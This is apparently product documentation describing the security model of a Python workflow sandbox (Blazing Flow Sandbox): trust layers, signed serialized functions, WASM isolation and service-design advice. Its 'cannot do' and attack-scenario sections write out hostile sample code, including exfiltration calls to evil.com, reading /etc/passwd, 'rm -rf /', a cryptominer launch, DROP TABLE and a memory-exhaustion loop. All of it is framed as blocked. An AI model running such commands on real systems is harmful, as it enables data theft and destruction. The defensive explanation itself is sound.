# Security Model

How Blazing Flow Sandbox keeps your infrastructure safe from untrusted code.

## The Three-Layer Security Model

```
┌─────────────────────────────────────────────────────────────────┐
│                     TRUST BOUNDARIES                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  LAYER 1: YOUR INFRASTRUCTURE (fully trusted)                    │
│  ════════════════════════════════════════════════════════       │
│  └── Coordinator / Foreman                                       │
│      • Orchestrates all workflows                                │
│      • Makes ALL scaling decisions                               │
│      • Routes operations to correct workers                      │
│      • NEVER runs user code                                      │
│      • NEVER deserializes user functions                         │
│                                                                  │
│  Security: Complete control, no user code execution              │
│                                                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  LAYER 2: TENANT CODE (semi-trusted - you built it)              │
│  ════════════════════════════════════════════════════════       │
│  └── Services + Connectors                                     │
│      • YOUR business logic                                       │
│      • Database credentials, API keys                            │
│      • Runs on TRUSTED workers (regular executors)               │
│      • Has full network, filesystem, process access              │
│                                                                  │
│  Security: Trusted code you control, reviewed by your team       │
│                                                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  LAYER 3: USER CODE (untrusted - end users wrote it)             │
│  ════════════════════════════════════════════════════════       │
│  └── Steps in Pyodide WASM sandbox                              │
│      • Runs on SANDBOXED workers (Pyodide executors)             │
│      • NO network access (httpx, requests not available)         │
│      • NO filesystem access (open(), pathlib not available)      │
│      • NO process spawning (subprocess not available)            │
│      • CAN ONLY call approved service methods                   │
│      • Complete memory isolation via WASM                        │
│                                                                  │
│  Security: Complete isolation, controlled interface              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## Cryptographic Signing Flow

Blazing Flow Sandbox uses a multi-layer security model with cryptographic signing to ensure that only validated, trusted code executes in your infrastructure.

### The Complete Signing Flow

**Step 1: Generate Signing Key**

```python
from blazing.dynamic_code import create_signing_key

# Generate a secure 32-byte HMAC key
SIGNING_KEY = create_signing_key()

# Store securely (environment variable, secret manager, etc.)
import os
os.environ['BLAZING_SIGNING_KEY'] = SIGNING_KEY.hex()
```

**Step 2: Client-Side Serialization + Signing**

```python
from blazing.dynamic_code import serialize_user_function

# User-provided transformation function
def user_transform(data):
    """Process data - double positive numbers."""
    return [x * 2 for x in data if x > 0]

# Serialize with AST validation + HMAC signing
serialized_code, signature = serialize_user_function(
    user_transform,
    signing_key=SIGNING_KEY,
    validate=True,  # AST validation before serialization
    strict_mode=True  # Block dangerous patterns
)

# serialized_code: Base64-encoded dill-serialized function
# signature: HMAC-SHA256 hex signature
```

**Step 3: Server-Side Verification + Execution**

```python
from blazing import Blazing
from blazing.dynamic_code import execute_signed_function

app = Blazing(api_url="http://localhost:8000", api_token="your-token")

@app.step(sandboxed=True)
async def execute_user_code(
    serialized_func: str,
    signature: str,
    *args,
    services=None,
    **kwargs
):
    """Execute signed user code with full security validation.

    Security Layers:
    1. Signature verification (before deserialization)
    2. Bytecode validation (after deserialization)
    3. Sandbox isolation (Pyodide WASM)
    """
    return await execute_signed_function(
        serialized_func,
        signature,
        args=args,
        kwargs=kwargs,
        signing_key=SIGNING_KEY,
        validate_bytecode=True,
    )

@app.workflow
async def process_user_strategy(data: list, services=None):
    """Workflow that executes signed user code."""
    # Execute the signed user function
    result = await execute_user_code(
        serialized_code,
        signature,
        data,
        services=services
    )
    return result
```

### Security Layers Explained

**Layer 1: AST Validation (Client-Side)**
- Blocks dangerous imports (`os`, `socket`, `subprocess`)
- Blocks dangerous builtins (`eval`, `exec`, `__import__`)
- Blocks filesystem operations (`open`, `pathlib`)
- Happens BEFORE serialization

**Layer 2: Cryptographic Signing (Client-Side)**
- HMAC-SHA256 signature of serialized code
- Prevents tampering during transmission
- Ensures code authenticity

**Layer 3: Signature Verification (Server-Side)**
- Validates signature BEFORE deserialization
- Refuses to deserialize tampered code
- Uses constant-time comparison to prevent timing attacks

**Layer 4: Bytecode Validation (Server-Side)**
- Inspects compiled bytecode for dangerous operations
- Defense-in-depth (secondary check after AST validation)
- Catches runtime code generation attempts

**Layer 5: Sandbox Isolation (Server-Side)**
- Pyodide WASM sandbox
- No network access
- No filesystem access
- No process spawning
- Complete memory isolation

## What User Code CANNOT Do

### ❌ Network Access

```python
@app.step
async def malicious_network(services=None):
    # ❌ FAILS - httpx not available in WASM
    import httpx
    response = await httpx.get("http://evil.com/exfiltrate")

    # ❌ FAILS - socket not available
    import socket
    s = socket.socket()
    s.connect(("evil.com", 80))

    # ❌ FAILS - urllib not available
    import urllib.request
    urllib.request.urlopen("http://evil.com")
```

**All network libraries are unavailable** in the WASM sandbox.

### ❌ Filesystem Access

```python
@app.step
async def malicious_filesystem(services=None):
    # ❌ FAILS - no filesystem in WASM
    with open('/etc/passwd') as f:
        secrets = f.read()

    # ❌ FAILS - pathlib not available
    from pathlib import Path
    Path('/tmp/backdoor.sh').write_text('rm -rf /')

    # ❌ FAILS - os module restricted
    import os
    os.system('curl http://evil.com')
```

**All filesystem operations are blocked.**

### ❌ Process Spawning

```python
@app.step
async def malicious_processes(services=None):
    # ❌ FAILS - subprocess not available
    import subprocess
    subprocess.run(['cryptominer', '--stealth'])

    # ❌ FAILS - os.fork() not available
    import os
    os.fork()

    # ❌ FAILS - multiprocessing not available
    from multiprocessing import Process
    p = Process(target=mine_bitcoin)
```

**No process creation allowed.**

### ❌ Cross-Tenant Access

```python
@app.step
async def malicious_cross_tenant(services=None):
    # ❌ FAILS - each execution is isolated
    # Cannot access other tenants' data
    # Cannot access other executions' memory
    # Cannot read environment variables from other jobs
    return {"error": "Isolation prevents cross-tenant access"}
```

**Complete isolation between executions.**

## What User Code CAN Do

### ✅ Pure Python Computation

```python
@app.step
async def safe_computation(data: list, services=None):
    # ✅ All pure Python works
    import math
    import json
    import base64
    from collections import Counter
    from itertools import groupby

    # Data processing
    result = [x * 2 for x in data if x > 0]

    # Math operations
    total = sum(result)
    average = total / len(result) if result else 0

    return {
        'result': result,
        'total': total,
        'average': average
    }
```

### ✅ Call Approved Service Methods

```python
@app.step
async def safe_service_call(user_id: int, services=None):
    # ✅ Can call approved service methods
    user = await services['DataAPI'].fetch_user(user_id)

    # Process in sandbox
    score = len(user['name']) * 10

    # ✅ Save via service
    await services['DataAPI'].save_score(user_id, score)

    return score
```

**User code → Service call → Executes on trusted worker**

## Service Security Bridge

### How Service Calls Work

```
┌─────────────────────┐
│  User Code (WASM)   │  1. User calls service method
└──────────┬──────────┘
           │
           ↓
┌─────────────────────┐
│  JS Bridge          │  2. Creates high-priority operation
│  (server.mjs)       │     priority = caller_priority + 100
└──────────┬──────────┘
           │
           ↓
┌─────────────────────┐
│  Foreman            │  3. Routes to trusted worker pool
└──────────┬──────────┘
           │
           ↓
┌─────────────────────┐
│  Trusted Worker     │  4. Executes with real credentials
│  (has connectors)   │
└──────────┬──────────┘
           │
           ↓
      [Database/API]      5. Accesses real infrastructure
```

### Priority Boost Prevents Deadlock

```python
# Station priority = 10.0
@app.step
async def sandboxed_step(services=None):
    # Calls service
    result = await services['API'].call()
    # ↑ Creates operation with priority = 10.0 + 100 = 110.0
    # Jumps ahead in queue, trusted worker picks it up immediately
```

**Prevents:** Sandboxed workers waiting for each other (deadlock).

## Security Guarantees

### ✅ Network Isolation

| Attack | Blocked By |
|--------|-----------|
| Data exfiltration via HTTP | WASM sandbox (no network libs) |
| DNS tunneling | No network stack available |
| WebSocket backdoors | No network access |
| API key theft | Keys never enter sandbox |

### ✅ Filesystem Isolation

| Attack | Blocked By |
|--------|-----------|
| Reading `/etc/passwd` | No filesystem in WASM |
| Writing backdoors | No file write capability |
| Reading environment variables | Env vars not accessible |
| Accessing other users' files | No filesystem access |

### ✅ Process Isolation

| Attack | Blocked By |
|--------|-----------|
| Spawning crypto miners | No subprocess module |
| Fork bombs | No process creation |
| System calls | WASM sandbox blocks all |

### ✅ Memory Isolation

| Attack | Blocked By |
|--------|-----------|
| Buffer overflows | WASM memory safety |
| Heap spraying | WASM prevents |
| Use-after-free | WASM memory model |
| Accessing other tenants | Separate WASM instances |

### ✅ Resource Limits

```python
# Enforced per execution:
CPU_LIMIT = 10 * 60  # 10 minutes (timeout)
MEMORY_LIMIT = 512 * 1024 * 1024  # 512 MB (WASM heap)
DISK_LIMIT = 0  # No disk access
NETWORK_LIMIT = 0  # No network
```

## Attack Scenarios & Mitigations

### Scenario 1: Crypto Mining

**Attack:**
```python
@app.step
async def mine_bitcoin(services=None):
    while True:  # Infinite loop
        hash = compute_hash()
```

**Mitigation:**
- ✅ CPU timeout kills execution after 10 minutes
- ✅ No network access (can't send results)
- ✅ WASM overhead makes mining unprofitable anyway

### Scenario 2: Data Exfiltration

**Attack:**
```python
@app.step
async def steal_data(services=None):
    # Fetch sensitive data
    user = await services['API'].get_user(123)

    # Try to exfiltrate
    import httpx
    httpx.post("http://evil.com", json=user)
```

**Mitigation:**
- ✅ No network libraries in WASM
- ✅ Even if data is fetched, cannot leave sandbox
- ✅ All service calls are logged (audit trail)

### Scenario 3: Code Injection

**Attack:**
```python
@app.step
async def inject_code(services=None):
    # Try to inject malicious code into service
    await services['API'].execute("DROP TABLE users")
```

**Mitigation:**
- ✅ Services validate all inputs (your code)
- ✅ Use parameterized queries (best practice)
- ✅ User can only call pre-defined methods

### Scenario 4: Resource Exhaustion

**Attack:**
```python
@app.step
async def exhaust_memory(services=None):
    # Try to OOM the server
    data = []
    while True:
        data.append("x" * 1024 * 1024)  # 1MB strings
```

**Mitigation:**
- ✅ WASM heap limited to 512MB
- ✅ Execution times out after 10 minutes
- ✅ Worker pools independent (doesn't affect other tenants)

## Best Practices

### 1. Minimize Service Surface Area

```python
# ❌ BAD - Too permissive
@app.service
class DatabaseAPI(BaseService):
    async def execute_sql(self, query: str):
        # User can run ANY SQL!
        return await self._db.execute(query)

# ✅ GOOD - Specific methods only
@app.service
class DatabaseAPI(BaseService):
    async def get_user(self, user_id: int) -> dict:
        # Parameterized, validated
        query = "SELECT * FROM users WHERE id = %s"
        return await self._db.execute(query, (user_id,))
```

### 2. Validate All Inputs

```python
@app.service
class DataAPI(BaseService):
    async def fetch_records(self, limit: int) -> list:
        # ✅ Validate inputs
        if not (1 <= limit <= 1000):
            raise ValueError("Limit must be 1-1000")

        query = "SELECT * FROM records LIMIT %s"
        return await self._db.execute(query, (limit,))
```

### 3. Use Private Methods for Helpers

```python
@app.service
class ProcessingAPI(BaseService):
    async def process(self, data: dict) -> dict:
        """Public method - user can call."""
        validated = self._validate(data)  # Private helper
        return self._transform(validated)   # Private helper

    def _validate(self, data: dict) -> dict:
        """Private - user CANNOT call."""
        # Validation logic
        return data

    def _transform(self, data: dict) -> dict:
        """Private - user CANNOT call."""
        # Transform logic
        return data
```

### 4. Log Everything

```python
import logging

logger = logging.getLogger(__name__)

@app.service
class AuditedAPI(BaseService):
    async def sensitive_operation(self, user_id: int):
        logger.info(f"Sensitive operation called for user {user_id}")
        try:
            result = await self._do_operation(user_id)
            logger.info(f"Operation succeeded for user {user_id}")
            return result
        except Exception as e:
            logger.error(f"Operation failed for user {user_id}: {e}")
            raise
```
